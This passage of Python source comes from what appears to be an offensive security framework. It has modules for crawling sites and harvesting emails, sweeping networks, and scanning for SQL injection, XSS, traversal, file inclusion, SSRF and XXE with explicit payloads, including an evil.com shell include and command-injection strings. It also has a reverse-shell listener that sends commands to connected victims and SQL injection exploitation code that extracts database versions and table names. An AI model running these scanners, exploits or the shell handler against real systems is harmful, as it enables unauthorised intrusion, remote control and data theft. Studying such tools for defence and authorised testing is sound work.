            if current_url in visited or current_depth > depth:
                return
            
            visited.add(current_url)
            print(f"{Fore.BLUE}[*] Crawling: {current_url}{Style.RESET_ALL}")
            
            try:
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(current_url, headers=headers, timeout=10, verify=False)
                
                if response.status_code == 200:
                    # Extract links
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all links
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urljoin(current_url, href)
                        if full_url not in visited:
                            to_visit.append((full_url, current_depth + 1))
                            results['links'].append(full_url)
                    
                    # Find forms
                    for form in soup.find_all('form'):
                        form_info = {
                            'action': form.get('action', ''),
                            'method': form.get('method', 'get').upper(),
                            'inputs': []
                        }
                        
                        for input_tag in form.find_all(['input', 'textarea', 'select']):
                            input_info = {
                                'name': input_tag.get('name', ''),
                                'type': input_tag.get('type', 'text'),
                                'value': input_tag.get('value', '')
                            }
                            form_info['inputs'].append(input_info)
                        
                        results['forms'].append(form_info)
                    
                    # Find emails
                    email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
                    emails = re.findall(email_pattern, response.text)
                    results['emails'].extend(emails)
                    
                    # Find comments
                    comments = soup.find_all(string=lambda text: isinstance(text, str) and '<!--' in text)
                    results['comments'].extend(comments)
                    
            except Exception as e:
                print(f"{Fore.RED}[-] Error crawling {current_url}: {str(e)}{Style.RESET_ALL}")
        
        # Start crawling
        while to_visit:
            current_url, current_depth = to_visit.pop(0)
            crawl(current_url, current_depth)
            
            # Limit visited pages
            if len(visited) > 100:
                print(f"{Fore.YELLOW}[!] Reached limit of 100 pages{Style.RESET_ALL}")
                break
        
        print(f"\n{Fore.CYAN}[*] Crawling completed{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Found:{Style.RESET_ALL}")
        print(f"  - Links: {len(results['links'])}")
        print(f"  - Forms: {len(results['forms'])}")
        print(f"  - Emails: {len(set(results['emails']))}")
        print(f"  - Comments: {len(results['comments'])}")
        
        # Save results
        output_file = f"crawl_results_{int(time.time())}.json"
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2)
        print(f"{Fore.YELLOW}[*] Results saved to: {output_file}{Style.RESET_ALL}")
    
    def run_network_mapper(self):
        """Network discovery and mapping"""
        network = self.module_options['network']
        do_ping = self.module_options.get('ping', 'true').lower() == 'true'
        
        print(f"{Fore.CYAN}[*] Mapping network: {network}{Style.RESET_ALL}")
        
        try:
            net = ipaddress.ip_network(network, strict=False)
            live_hosts = []
            
            def ping_host(ip):
                if do_ping:
                    param = '-n' if os.name == 'nt' else '-c'
                    command = ['ping', param, '1', '-W', '1', str(ip)]
                    try:
                        output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        if output.returncode == 0:
                            return str(ip)
                    except:
                        pass
                return None
            
            print(f"{Fore.BLUE}[*] Scanning {net.num_addresses} addresses...{Style.RESET_ALL}")
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(ping_host, ip): ip for ip in net.hosts()}
                
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result:
                        live_hosts.append(result)
                        print(f"{Fore.GREEN}[+] Live host: {result}{Style.RESET_ALL}")
            
            print(f"\n{Fore.CYAN}[*] Network mapping completed{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Found {len(live_hosts)} live hosts{Style.RESET_ALL}")
            
            if live_hosts:
                print(f"\n{Fore.YELLOW}[*] Live hosts:{Style.RESET_ALL}")
                for host in live_hosts:
                    try:
                        hostname = socket.gethostbyaddr(host)[0]
                        print(f"  {host} -> {hostname}")
                    except:
                        print(f"  {host}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    def run_os_detection(self):
        """OS detection using TCP/IP fingerprinting"""
        target = self.module_options['target']
        
        print(f"{Fore.CYAN}[*] Detecting OS for {target}{Style.RESET_ALL}")
        
        # Simple TTL-based OS detection
        try:
            # Send ICMP ping
            param = '-n' if os.name == 'nt' else '-c'
            command = ['ping', param, '1', '-W', '2', target]
            output = subprocess.run(command, capture_output=True, text=True)
            
            if 'TTL=' in output.stdout or 'ttl=' in output.stdout.lower():
                # Extract TTL
                match = re.search(r'TTL=(\d+)', output.stdout.upper())
                if match:
                    ttl = int(match.group(1))
                    
                    # OS detection based on TTL
                    if ttl <= 64:
                        os_guess = "Linux/Unix"
                    elif ttl <= 128:
                        os_guess = "Windows"
                    elif ttl <= 255:
                        os_guess = "Cisco/Network Device"
                    else:
                        os_guess = "Unknown"
                    
                    print(f"{Fore.GREEN}[+] TTL: {ttl} -> Likely OS: {os_guess}{Style.RESET_ALL}")
                    
                    # Additional checks
                    try:
                        # Check common ports for more info
                        common_ports = [22, 3389, 445]
                        for port in common_ports:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(1)
                            if sock.connect_ex((target, port)) == 0:
                                service = self.get_service_name(port)
                                print(f"{Fore.YELLOW}[*] Port {port} open - {service}{Style.RESET_ALL}")
                            sock.close()
                    except:
                        pass
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
    
    # ============ SCAN MODULES ============
    
    def run_vuln_scanner(self):
        """Comprehensive vulnerability scanner"""
        target = self.module_options['target']
        scan_type = self.module_options.get('scan_type', 'full')
        
        print(f"{Fore.CYAN}[*] Scanning {target} for vulnerabilities{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Scan type: {scan_type}{Style.RESET_ALL}\n")
        
        vulnerabilities = []
        
        # Check for common web vulnerabilities
        checks = [
            ("SQL Injection", self.check_sql_injection),
            ("XSS", self.check_xss),
            ("CSRF", self.check_csrf),
            ("Directory Traversal", self.check_dir_traversal),
            ("File Inclusion", self.check_file_inclusion),
            ("SSRF", self.check_ssrf),
            ("XXE", self.check_xxe),
            ("Command Injection", self.check_command_injection),
        ]
        
        for vuln_name, check_func in checks:
            print(f"{Fore.YELLOW}[*] Checking: {vuln_name}{Style.RESET_ALL}")
            try:
                result = check_func(target)
                if result:
                    vulnerabilities.append((vuln_name, result))
                    print(f"{Fore.GREEN}[+] Potential {vuln_name} found{Style.RESET_ALL}")
                else:
                    print(f"{Fore.BLUE}[-] No {vuln_name} detected{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error checking {vuln_name}: {str(e)[:50]}{Style.RESET_ALL}")
            time.sleep(0.5)
        
        # Check HTTP security headers
        print(f"{Fore.YELLOW}[*] Checking security headers{Style.RESET_ALL}")
        headers_vulns = self.check_security_headers(target)
        vulnerabilities.extend(headers_vulns)
        
        print(f"\n{Fore.CYAN}[*] Vulnerability scan completed{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Found {len(vulnerabilities)} potential vulnerabilities{Style.RESET_ALL}")
        
        # Generate report
        if vulnerabilities:
            report_file = f"vuln_scan_{int(time.time())}.txt"
            with open(report_file, 'w', encoding='utf-8') as f:
                f.write(f"Vulnerability Scan Report - {target}\n")
                f.write(f"Generated: {datetime.now()}\n")
                f.write("=" * 50 + "\n\n")
                
                for vuln_name, details in vulnerabilities:
                    f.write(f"[{vuln_name}]\n")
                    f.write(f"Details: {details}\n")
                    f.write("-" * 30 + "\n")
            
            print(f"{Fore.YELLOW}[*] Report saved to: {report_file}{Style.RESET_ALL}")
    
    def check_sql_injection(self, url):
        """Advanced SQL injection check"""
        payloads = [
            "'", "\"", "' OR '1'='1", "' UNION SELECT NULL--",
            "' AND 1=CONVERT(int, @@version)--", "1; SELECT pg_sleep(5)--",
            "' OR SLEEP(5) AND '1'='1", "' OR BENCHMARK(1000000, MD5('A'))--"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Check for error messages
                error_indicators = [
                    'sql', 'syntax', 'mysql', 'postgresql', 'oracle',
                    'database', 'query', 'unclosed', 'unterminated'
                ]
                
                content = response.text.lower()
                if any(indicator in content for indicator in error_indicators):
                    return f"Error-based SQLi with payload: {payload}"
                
                # Check for time delays
                start = time.time()
                response = requests.get(test_url, headers=headers, timeout=15, verify=False)
                elapsed = time.time() - start
                
                if elapsed > 5:
                    return f"Time-based SQLi with payload: {payload} (delay: {elapsed:.2f}s)"
                    
            except requests.exceptions.Timeout:
                return f"Potential time-based SQLi (timeout with payload: {payload})"
            except:
                continue
        
        return None
    
    def check_xss(self, url):
        """Advanced XSS check"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                if payload in response.text:
                    return f"Reflected XSS with payload: {payload}"
            except:
                continue
        
        return None
    
    def check_csrf(self, url):
        """Check for CSRF vulnerabilities"""
        try:
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            # Look for forms without CSRF tokens
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                has_csrf = False
                inputs = form.find_all('input')
                
                for input_tag in inputs:
                    if input_tag.get('name', '').lower() in ['csrf', 'token', '_token', 'csrf_token']:
                        has_csrf = True
                        break
                
                if not has_csrf and form.get('action'):
                    return f"Form without CSRF protection: {form.get('action')}"
                    
        except:
            pass
        
        return None
    
    def check_dir_traversal(self, url):
        """Check for directory traversal"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\windows\\win.ini",
            "....//....//etc/passwd",
            "%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                content = response.text.lower()
                if 'root:' in content or '[extensions]' in content:
                    return f"Directory traversal with payload: {payload}"
            except:
                continue
        
        return None
    
    def check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "http://evil.com/shell.txt"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                if 'root:' in response.text or '<?php' in response.text:
                    return f"File inclusion with payload: {payload}"
            except:
                continue
        
        return None
    
    def check_ssrf(self, url):
        """Check for SSRF vulnerabilities"""
        test_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:80/",
            "http://127.0.0.1:22/"
        ]
        
        for test_url in test_urls:
            try:
                payload_url = f"{url}?url={test_url}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(payload_url, headers=headers, timeout=10, verify=False)
                
                if 'ami-id' in response.text or 'ssh' in response.text.lower():
                    return f"Potential SSRF to: {test_url}"
            except:
                continue
        
        return None
    
    def check_xxe(self, url):
        """Check for XXE vulnerabilities"""
        xxe_payload = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>"""
        
        try:
            headers = {
                'User-Agent': self.config['user_agent'],
                'Content-Type': 'application/xml'
            }
            response = requests.post(url, data=xxe_payload, headers=headers, timeout=10, verify=False)
            
            if 'root:' in response.text:
                return "XXE vulnerability detected"
        except:
            pass
        
        return None
    
    def check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            "; ls -la",
            "| dir",
            "`whoami`",
            "$(id)",
            "|| ping -c 5 127.0.0.1"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                start = time.time()
                response = requests.get(test_url, headers=headers, timeout=15, verify=False)
                elapsed = time.time() - start
                
                if elapsed > 5 or 'uid=' in response.text or 'Directory of' in response.text:
                    return f"Command injection with payload: {payload}"
            except:
                continue
        
        return None
    
    def check_security_headers(self, url):
        """Check for missing security headers"""
        try:
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            security_headers = {
                'X-Frame-Options': 'Missing X-Frame-Options (clickjacking protection)',
                'X-Content-Type-Options': 'Missing X-Content-Type-Options (MIME sniffing protection)',
                'X-XSS-Protection': 'Missing X-XSS-Protection (XSS filter)',
                'Strict-Transport-Security': 'Missing HSTS header',
                'Content-Security-Policy': 'Missing Content-Security-Policy',
                'Referrer-Policy': 'Missing Referrer-Policy'
            }
            
            vulns = []
            for header, message in security_headers.items():
                if header not in response.headers:
                    vulns.append(("Security Headers", message))
            
            return vulns
        except:
            return []
    
    def run_sql_scanner(self):
        """Advanced SQL injection scanner"""
        url = self.module_options['url']
        technique = self.module_options.get('technique', 'time_based,error_based,boolean')
        
        print(f"{Fore.CYAN}[*] Scanning for SQL injection: {url}{Style.RESET_ALL}")
        
        techniques = technique.split(',')
        results = []
        
        # Test each technique
        if 'error_based' in techniques:
            print(f"{Fore.YELLOW}[*] Testing error-based SQLi{Style.RESET_ALL}")
            result = self.test_error_based_sqli(url)
            if result:
                results.append(("Error-based", result))
        
        if 'time_based' in techniques:
            print(f"{Fore.YELLOW}[*] Testing time-based SQLi{Style.RESET_ALL}")
            result = self.test_time_based_sqli(url)
            if result:
                results.append(("Time-based", result))
        
        if 'boolean' in techniques:
            print(f"{Fore.YELLOW}[*] Testing boolean-based SQLi{Style.RESET_ALL}")
            result = self.test_boolean_sqli(url)
            if result:
                results.append(("Boolean-based", result))
        
        if 'union' in techniques:
            print(f"{Fore.YELLOW}[*] Testing UNION-based SQLi{Style.RESET_ALL}")
            result = self.test_union_sqli(url)
            if result:
                results.append(("UNION-based", result))
        
        print(f"\n{Fore.CYAN}[*] SQL injection scan completed{Style.RESET_ALL}")
        
        if results:
            print(f"{Fore.GREEN}[+] Found {len(results)} SQL injection vulnerabilities{Style.RESET_ALL}")
            for vuln_type, details in results:
                print(f"  {vuln_type}: {details}")
        else:
            print(f"{Fore.YELLOW}[*] No SQL injection vulnerabilities found{Style.RESET_ALL}")
    
    def test_error_based_sqli(self, url):
        """Test for error-based SQL injection"""
        payloads = [
            "'", "\"", "'\"", "\"'", "`",
            "' AND 1=CONVERT(int, @@version)--",
            "' OR 1=CONVERT(int, @@version)--"
        ]
        
        for payload in payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                error_patterns = [
                    r"SQL.*error",
                    r"Warning.*mysql",
                    r"PostgreSQL.*ERROR",
                    r"ORA-\d+",
                    r"Microsoft.*Driver",
                    r"syntax.*error",
                    r"unclosed.*quotation",
                    r"unterminated.*string"
                ]
                
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return f"Error with payload: {payload}"
                        
            except:
                continue
        
        return None
    
    def test_time_based_sqli(self, url):
        """Test for time-based SQL injection"""
        time_payloads = [
            "' OR SLEEP(5)--",
            "' OR BENCHMARK(1000000, MD5('A'))--",
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--"
        ]
        
        for payload in time_payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                start = time.time()
                response = requests.get(test_url, headers=headers, timeout=15, verify=False)
                elapsed = time.time() - start
                
                if elapsed > 4:
                    return f"Time delay ({elapsed:.2f}s) with payload: {payload}"
                    
            except requests.exceptions.Timeout:
                return f"Timeout with payload: {payload}"
            except:
                continue
        
        return None
    
    def test_boolean_sqli(self, url):
        """Test for boolean-based SQL injection"""
        # This is a simplified check
        true_conditions = ["' OR '1'='1", "' OR 1=1--"]
        false_conditions = ["' OR '1'='2", "' OR 1=2--"]
        
        try:
            # Get original response
            headers = {'User-Agent': self.config['user_agent']}
            original = requests.get(url, headers=headers, timeout=10, verify=False)
            original_length = len(original.text)
            
            for true_payload, false_payload in zip(true_conditions, false_conditions):
                true_url = url.replace('=', f"={true_payload}")
                false_url = url.replace('=', f"={false_payload}")
                
                true_resp = requests.get(true_url, headers=headers, timeout=10, verify=False)
                false_resp = requests.get(false_url, headers=headers, timeout=10, verify=False)
                
                # Check for differences
                if len(true_resp.text) != len(false_resp.text):
                    return f"Boolean condition difference with payloads: {true_payload}/{false_payload}"
                    
        except:
            pass
        
        return None
    
    def test_union_sqli(self, url):
        """Test for UNION-based SQL injection"""
        union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT @@version,2,3--"
        ]
        
        for payload in union_payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Check for database information
                db_indicators = [
                    'mysql', 'postgresql', 'oracle', 'sqlite',
                    'microsoft sql', 'mariadb', 'database'
                ]
                
                content = response.text.lower()
                if any(indicator in content for indicator in db_indicators):
                    return f"UNION query with payload: {payload}"
                    
            except:
                continue
        
        return None
    
    def run_xss_scanner(self):
        """Advanced XSS scanner"""
        url = self.module_options['url']
        method = self.module_options.get('method', 'GET').upper()
        
        print(f"{Fore.CYAN}[*] Scanning for XSS vulnerabilities: {url}{Style.RESET_ALL}")
        
        # Test different XSS payloads
        payloads = [
            # Basic payloads
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            
            # Obfuscated payloads
            "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
            "<img src=\"x\" `\"'><script>alert('XSS')</script>",
            
            # Event handlers
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            
            # JavaScript URI
            "javascript:alert('XSS')",
            "JaVaScRiPt:alert('XSS')",
            
            # HTML entities
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            
            # Unicode
            "＜script＞alert('XSS')＜/script＞"
        ]
        
        found = []
        
        for payload in payloads:
            try:
                if method == 'GET':
                    test_url = f"{url}{payload}"
                    headers = {'User-Agent': self.config['user_agent']}
                    response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                else:
                    # For POST requests, we need to identify parameters
                    headers = {'User-Agent': self.config['user_agent']}
                    response = requests.post(url, data={'input': payload}, headers=headers, timeout=10, verify=False)
                
                # Check if payload appears in response
                if payload in response.text:
                    found.append(payload)
                    print(f"{Fore.GREEN}[+] XSS found with payload: {payload[:50]}...{Style.RESET_ALL}")
                else:
                    # Check for decoded payload
                    decoded_payload = payload.replace('&lt;', '<').replace('&gt;', '>')
                    if decoded_payload in response.text:
                        found.append(payload)
                        print(f"{Fore.GREEN}[+] XSS found (decoded) with payload: {payload[:50]}...{Style.RESET_ALL}")
                        
            except Exception as e:
                print(f"{Fore.RED}[-] Error testing payload {payload[:20]}: {str(e)}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] XSS scan completed{Style.RESET_ALL}")
        if found:
            print(f"{Fore.GREEN}[+] Found {len(found)} XSS vulnerabilities{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] No XSS vulnerabilities found{Style.RESET_ALL}")
    
    def run_ssl_scanner(self):
        """SSL/TLS vulnerability scanner"""
        target = self.module_options['target']
        
        print(f"{Fore.CYAN}[*] Scanning SSL/TLS configuration: {target}{Style.RESET_ALL}")
        
        try:
            # Parse host and port
            if ':' in target:
                host, port = target.split(':')
                port = int(port)
            else:
                host = target
                port = 443
            
            # Test SSL connection
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((host, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate validity
                    print(f"{Fore.YELLOW}[*] Certificate Information:{Style.RESET_ALL}")
                    
                    # Check expiry
                    not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_left = (not_after - datetime.now()).days
                    
                    if days_left < 0:
                        print(f"{Fore.RED}[-] Certificate expired {abs(days_left)} days ago{Style.RESET_ALL}")
                    elif days_left < 30:
                        print(f"{Fore.YELLOW}[!] Certificate expires in {days_left} days{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.GREEN}[+] Certificate valid for {days_left} more days{Style.RESET_ALL}")
                    
                    # Check weak protocols
                    print(f"{Fore.YELLOW}[*] Testing protocols...{Style.RESET_ALL}")
                    
                    weak_protocols = ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']
                    for protocol in weak_protocols:
                        try:
                            context = ssl.SSLContext(getattr(ssl, f"PROTOCOL_{protocol.upper().replace('V', '_V')}"))
                            with socket.create_connection((host, port), timeout=5) as s:
                                with context.wrap_socket(s, server_hostname=host) as ss:
                                    print(f"{Fore.RED}[-] {protocol} enabled (WEAK){Style.RESET_ALL}")
                        except:
                            print(f"{Fore.GREEN}[+] {protocol} disabled{Style.RESET_ALL}")
                    
                    # Check weak ciphers (simplified)
                    print(f"{Fore.YELLOW}[*] Checking cipher strength...{Style.RESET_ALL}")
                    cipher = ssock.cipher()
                    if cipher:
                        print(f"{Fore.GREEN}[+] Current cipher: {cipher[0]}{Style.RESET_ALL}")
                        
                        # Check for weak ciphers
                        weak_ciphers = ['RC4', 'DES', '3DES', 'NULL', 'EXPORT']
                        if any(weak in cipher[0] for weak in weak_ciphers):
                            print(f"{Fore.RED}[-] Weak cipher detected: {cipher[0]}{Style.RESET_ALL}")
                    
        except Exception as e:
            print(f"{Fore.RED}[-] SSL scan error: {str(e)}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] SSL scan completed{Style.RESET_ALL}")
    
    def run_dir_traversal(self):
        """Directory traversal scanner"""
        url = self.module_options['url']
        depth = int(self.module_options.get('depth', 3))
        
        print(f"{Fore.CYAN}[*] Scanning for directory traversal: {url}{Style.RESET_ALL}")
        
        # Common traversal payloads
        payloads = []
        for i in range(1, depth + 1):
            dots = '../' * i
            payloads.extend([
                f"{dots}etc/passwd",
                f"{dots}windows/win.ini",
                f"{dots}boot.ini",
                f"{dots}etc/shadow",
                f"{dots}etc/hosts",
                f"{dots}..\\windows\\win.ini",
                f"..%2f{'..%2f' * (i-1)}etc/passwd",
                f"..%c0%af{'..%c0%af' * (i-1)}etc/passwd"
            ])
        
        found = []
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Check for success indicators
                indicators = [
                    'root:', '[boot loader]', '[fonts]',
                    '[extensions]', 'daemon:', 'bin:', 'sys:'
                ]
                
                for indicator in indicators:
                    if indicator in response.text:
                        found.append(payload)
                        print(f"{Fore.GREEN}[+] Directory traversal found: {payload}{Style.RESET_ALL}")
                        break
                        
            except Exception as e:
                continue
        
        print(f"\n{Fore.CYAN}[*] Directory traversal scan completed{Style.RESET_ALL}")
        if found:
            print(f"{Fore.GREEN}[+] Found {len(found)} directory traversal vulnerabilities{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] No directory traversal vulnerabilities found{Style.RESET_ALL}")
    
    # ============ EXPLOIT MODULES ============
    
    def run_multi_handler(self):
        """Multi/handler for reverse connections"""
        lhost = self.module_options.get('lhost', self.config['lhost'])
        lport = int(self.module_options.get('lport', 4444))
        
        print(f"{Fore.CYAN}[*] Starting multi/handler on {lhost}:{lport}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Waiting for connections...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop{Style.RESET_ALL}\n")
        
        try:
            # Create listening socket
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((lhost, lport))
            server.listen(5)
            server.settimeout(1)
            
            connections = []
            
            while True:
                try:
                    client, addr = server.accept()
                    print(f"{Fore.GREEN}[+] Connection received from {addr[0]}:{addr[1]}{Style.RESET_ALL}")
                    connections.append((client, addr))
                    
                    # Handle connection in separate thread
                    threading.Thread(target=self.handle_reverse_shell, args=(client, addr)).start()
                    
                except socket.timeout:
                    continue
                except KeyboardInterrupt:
                    break
                    
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
        finally:
            print(f"{Fore.YELLOW}[*] Stopping multi/handler{Style.RESET_ALL}")
    
    def handle_reverse_shell(self, client, addr):
        """Handle reverse shell connection"""
        try:
            print(f"{Fore.GREEN}[*] Shell session opened with {addr[0]}{Style.RESET_ALL}")
            
            # Send welcome message
            welcome = b"\nKNDYS Framework - Reverse Shell Session\n"
            client.send(welcome)
            
            # Interactive shell
            while True:
                try:
                    # Show prompt
                    prompt = f"{Fore.CYAN}kndys-shell{Fore.RED}@{addr[0]}{Fore.CYAN}$ {Style.RESET_ALL}"
                    cmd = input(prompt)
                    
                    if cmd.lower() in ['exit', 'quit']:
                        client.send(b'exit\n')
                        break
                    
                    client.send(cmd.encode() + b'\n')
                    
                    # Receive output
                    client.settimeout(0.5)
                    output = b''
                    try:
                        while True:
                            chunk = client.recv(4096)
                            if not chunk:
                                break
                            output += chunk
                    except socket.timeout:
                        pass
                    
                    if output:
                        print(output.decode('utf-8', errors='ignore'))
                        
                except KeyboardInterrupt:
                    client.send(b'\x03')  # Ctrl+C
                    continue
                except Exception as e:
                    print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
                    break
                    
        except Exception as e:
            print(f"{Fore.RED}[-] Shell error: {str(e)}{Style.RESET_ALL}")
        finally:
            client.close()
            print(f"{Fore.YELLOW}[*] Shell session closed{Style.RESET_ALL}")
    
    def run_sql_injection(self):
        """SQL injection exploitation"""
        url = self.module_options['url']
        technique = self.module_options.get('technique', 'union')
        
        print(f"{Fore.CYAN}[*] Exploiting SQL injection: {url}{Style.RESET_ALL}")
        
        if technique == 'union':
            self.exploit_union_sqli(url)
        elif technique == 'error':
            self.exploit_error_sqli(url)
        else:
            print(f"{Fore.RED}[!] Technique {technique} not implemented{Style.RESET_ALL}")
    
    def exploit_union_sqli(self, url):
        """Exploit UNION-based SQL injection"""
        print(f"{Fore.YELLOW}[*] Attempting UNION-based exploitation{Style.RESET_ALL}")
        
        # First, find number of columns
        print(f"{Fore.BLUE}[*] Finding number of columns...{Style.RESET_ALL}")
        
        for i in range(1, 10):
            payload = f"' ORDER BY {i}--"
            test_url = url.replace('=', f"={payload}")
            
            try:
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Check for error
                if 'error' in response.text.lower() or 'order by' in response.text.lower():
                    num_columns = i - 1
                    print(f"{Fore.GREEN}[+] Number of columns: {num_columns}{Style.RESET_ALL}")
                    break
            except:
                continue
        
        # Try to extract database version
        print(f"{Fore.BLUE}[*] Extracting database information...{Style.RESET_ALL}")
        
        version_payloads = [
            f"' UNION SELECT @@version,{','.join(['NULL']*(num_columns-1))}--",
            f"' UNION SELECT version(),{','.join(['NULL']*(num_columns-1))}--",
            f"' UNION SELECT sqlite_version(),{','.join(['NULL']*(num_columns-1))}--"
        ]
        
        for payload in version_payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Look for version string
                version_pattern = r'\d+\.\d+\.\d+'
                match = re.search(version_pattern, response.text)
                if match:
                    print(f"{Fore.GREEN}[+] Database version: {match.group()}{Style.RESET_ALL}")
                    break
            except:
                continue
        
        # Try to extract table names
        print(f"{Fore.BLUE}[*] Attempting to extract table names...{Style.RESET_ALL}")
        
        table_payloads = [
            f"' UNION SELECT table_name,{','.join(['NULL']*(num_columns-1))} FROM information_schema.tables--",
            f"' UNION SELECT name,{','.join(['NULL']*(num_columns-1))} FROM sqlite_master WHERE type='table'--"
        ]
        
        for payload in table_payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Look for common table names
                common_tables = ['users', 'admin', 'customer', 'product', 'order']
                for table in common_tables:
                    if table in response.text.lower():
                        print(f"{Fore.GREEN}[+] Found table: {table}{Style.RESET_ALL}")
            except:
                continue
        
        print(f"\n{Fore.CYAN}[*] SQL injection exploitation completed{Style.RESET_ALL}")
    
    def exploit_error_sqli(self, url):
        """Exploit error-based SQL injection"""
        print(f"{Fore.YELLOW}[*] Attempting error-based exploitation{Style.RESET_ALL}")
        
        # Try to extract database version through errors
        error_payloads = [
            "' AND 1=CONVERT(int, @@version)--",
            "' OR 1=CONVERT(int, @@version)--",
            "' AND EXTRACTVALUE(1, CONCAT(0x5c, @@version))--"
        ]
        
        for payload in error_payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Extract version from error message
                version_pattern = r'\d+\.\d+\.\d+'
                match = re.search(version_pattern, response.text)
                if match:
                    print(f"{Fore.GREEN}[+] Database version (from error): {match.group()}{Style.RESET_ALL}")
                    break
            except:
                continue
        
